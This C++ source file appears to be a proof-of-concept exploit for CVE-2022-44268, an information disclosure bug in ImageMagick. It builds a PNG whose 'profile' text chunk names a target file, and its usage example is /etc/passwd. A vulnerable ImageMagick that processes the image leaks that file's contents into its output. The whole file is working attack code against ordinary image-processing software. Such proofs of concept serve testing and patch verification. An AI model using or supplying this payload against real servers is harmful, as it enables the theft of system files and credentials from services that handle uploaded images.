/*
 Written by David Hoyt @h02332
 Compile:
 clang++  pilgrimage.cpp -lpng -lz -o pilgrimage -I/opt/homebrew/include -L/opt/homebrew/lib
 Run:
 ./pilgrimage /etc/passwd
 Based on the pilgrimage bug: The researchers at MetabaseQ discovered CVE-2022-44268, i.e. ImageMagick 7.1.0-49 is vulnerable to Information Disclosure. When it parses a PNG image (e.g., for resize), the resulting image could have embedded the content of an arbitrary remote file (if the ImageMagick binary has permissions to read it).
 */
#include <iostream>
#include <cstring>
#include <png.h>

void createImageWithText(const char *profileValue) {
    int width = 400;
    int height = 200;

    FILE *fp = fopen("Exploit.png", "wb");
    if (!fp) {
        std::cerr << "Error opening file for writing." << std::endl;
        return;
    }

    png_structp png_ptr = png_create_write_struct(PNG_LIBPNG_VER_STRING, NULL, NULL, NULL);
    if (!png_ptr) {
        std::cerr << "Error during png_create_write_struct()." << std::endl;
        return;
    }

    png_infop info_ptr = png_create_info_struct(png_ptr);
    if (!info_ptr) {
        png_destroy_write_struct(&png_ptr, NULL);
        std::cerr << "Error during png_create_info_struct()." << std::endl;
        return;
    }

    png_init_io(png_ptr, fp);

    png_set_IHDR(png_ptr, info_ptr, width, height, 8, PNG_COLOR_TYPE_RGB, PNG_INTERLACE_NONE, 
                 PNG_COMPRESSION_TYPE_DEFAULT, PNG_FILTER_TYPE_DEFAULT);

    png_text text_chunk;
    text_chunk.compression = PNG_TEXT_COMPRESSION_NONE;
//    text_chunk.key = "profile";
    text_chunk.key = const_cast<png_charp>("profile");
    text_chunk.text = (char *)profileValue;
    png_set_text(png_ptr, info_ptr, &text_chunk, 1);

    png_byte **row_pointers = (png_byte **)png_malloc(png_ptr, height * sizeof(png_byte *));
    for (int y = 0; y < height; y++) {
        png_byte *row = (png_byte *)png_malloc(png_ptr, sizeof(uint8_t) * width * 3);
        row_pointers[y] = row;
        for (int x = 0; x < width; x++) {
            row[x * 3] = 255;
            row[x * 3 + 1] = 255;
            row[x * 3 + 2] = 255;
        }
    }

    png_set_rows(png_ptr, info_ptr, row_pointers);
    png_write_png(png_ptr, info_ptr, PNG_TRANSFORM_IDENTITY, NULL);

    for (int y = 0; y < height; y++) {
        png_free(png_ptr, row_pointers[y]);
    }
    png_free(png_ptr, row_pointers);

    png_destroy_write_struct(&png_ptr, &info_ptr);
    fclose(fp);

    std::cout << "Exploit.png Create Success" << std::endl;
    std::cout << "Add text " << profileValue << " into Exploit.png" << std::endl;
}

int main(int argc, char *argv[]) {
    if (argc != 2) {
        std::cerr << "Usage: " << argv[0] << " <Profile_Value>" << std::endl;
        return 1;
    }

    createImageWithText(argv[1]);

    return 0;
}

